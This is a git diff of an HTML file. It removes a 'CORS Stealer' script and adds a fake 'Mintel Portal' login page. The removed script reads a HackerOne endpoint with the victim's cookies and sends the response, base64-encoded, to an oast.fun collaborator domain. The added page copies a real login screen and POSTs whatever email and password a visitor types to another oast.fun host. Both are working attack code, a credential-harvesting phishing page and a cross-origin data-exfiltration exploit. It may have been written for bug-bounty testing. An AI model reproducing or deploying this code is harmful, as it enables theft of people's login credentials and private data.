@@ -1,23 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>CORS Stealer</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mintel Portal | Log in</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background: #ffdd00;
+      padding: 15px 30px;
+      font-weight: bold;
+      font-size: 20px;
+    }
+    nav {
+      background: #fff;
+      border-bottom: 1px solid #ddd;
+      padding: 10px 30px;
+      display: flex;
+      gap: 15px;
+    }
+    nav a {
+      text-decoration: none;
+      color: #222;
+      font-weight: bold;
+    }
+    main {
+      padding: 40px 30px;
+      max-width: 600px;
+      margin: auto;
+      background: #fff;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+    h1 {
+      font-size: 26px;
+      margin-bottom: 20px;
+    }
+    p.info {
+      background: #e9f3ff;
+      border-left: 5px solid #007bff;
+      padding: 15px;
+      font-size: 14px;
+      margin-bottom: 30px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .remember {
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 10px 25px;
+      background: #999;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .extra-links {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .extra-links a {
+      color: #007bff;
+      text-decoration: none;
+      margin-right: 15px;
+    }
+  </style>
 </head>
 <body>
-  <h1>💀 CORS Exploit Active</h1>
-  <script>
-    fetch("https://hackerone.com/user/csrf", {
-      method: "GET",
-      credentials: "include"
-    })
-    .then(response => response.text())
-    .then(data => {
-      console.log("💉 CORS Response:", data);
+  <header>MINTEL</header>
+  <nav>
+    <a href="#">Mintel Portal</a>
+    <a href="#">About Mintel</a>
+  </nav>
+  <main>
+    <h1>Welcome to <strong>Mintel</strong></h1>
+    <p class="info">
+      ℹ️ Enter your company or institution email address. Next you’ll be asked for your Mintel password, or sent to your company or institution website to sign in with your company or institution login details. Note: Shibboleth users should use the Federated Login.
+    </p>
+    <form id="loginForm">
+      <label for="email">Client / Campus Login</label>
+      <input type="email" id="email" name="email" placeholder="Enter your email address" required>
 
-      // 🎯 Exfiltrate to your Burp Collaborator domain
-      fetch("https://uqzlsysrbcsyahvblusfdfedocb2a63ps.oast.fun/?leak=" + btoa(data));
-    })
-    .catch(err => console.error("❌ Exploit failed:", err));
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+      <div class="remember">
+        <input type="checkbox" id="remember" checked>
+        <label for="remember">Remember me</label>
+      </div>
+      <button type="submit">Next</button>
+    </form>
+    <div class="extra-links">
+      Need federated login? <a href="#">Login here</a><br>
+      New to Mintel? <a href="#">Register</a>
+    </div>
+  </main>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      
+      fetch('https://edvfzmgfkfhvjwltgauinx4ygplpv9w82.oast.fun', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password
+        })
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log('Credentials sent successfully:', data);
+        // Optionally, show a success message to the user or redirect
+        alert('Login credentials submitted successfully!');
+      })
+      .catch(error => {
+        console.error('Error sending credentials:', error);
+        // Optionally, show an error message to the user
+        alert('Error submitting login credentials. Please try again.');
+      });
+    });
   </script>
 </body>
 </html>
